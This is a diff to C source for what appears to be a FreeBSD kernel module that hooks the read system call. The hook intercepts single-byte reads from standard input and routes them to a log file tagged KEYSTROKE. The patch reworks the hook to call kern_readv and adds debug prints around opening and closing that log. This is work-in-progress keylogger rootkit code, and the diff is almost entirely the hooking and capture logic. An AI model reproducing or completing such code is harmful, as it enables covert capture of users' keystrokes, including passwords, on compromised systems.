@@ -180,16 +180,30 @@ int hook_sys_openat(struct thread * td, struct openat_args * uap) {
 
 int hook_sys_read(struct thread *td, struct read_args * uap){
 
+	struct uio auio;
+	struct iovec aiov;
+	int error;
+
+	if (uap->nbyte > IOSIZE_MAX)
+		return (EINVAL);
+	aiov.iov_base = uap->buf;
+	aiov.iov_len = uap->nbyte;
+	auio.uio_iov = &aiov;
+	auio.uio_iovcnt = 1;
+	auio.uio_resid = uap->nbyte;
+	auio.uio_segflg = UIO_USERSPACE;
+	error = kern_readv(td, uap->fd, &auio);
+
+
 		
 
-	int error;
 	char buf[1];
 	int done;
 
-	error = sys_read(td, uap);
 
-	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
+	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)){
 		return(error);
+	}
 
 
 
@@ -197,19 +211,17 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 
 	
 
-	printf("%c", buf[0]);
+	// printf("%c", buf[0]);
 
 	int testfd = 0;
 
-	filewriter_openlog(curthread, &testfd, KEYSTROKE);
+	int testerror = filewriter_openlog(td, &testfd, KEYSTROKE);
 	
-	filewriter_closelog(curthread, testfd);	
+	printf("testerror is %d\n", testerror);
 
-	
-	
+	testerror = filewriter_closelog(td, testfd);	
 
-
-	
+	printf("testerror is %d\n", testerror);
 
 	return(error);
 
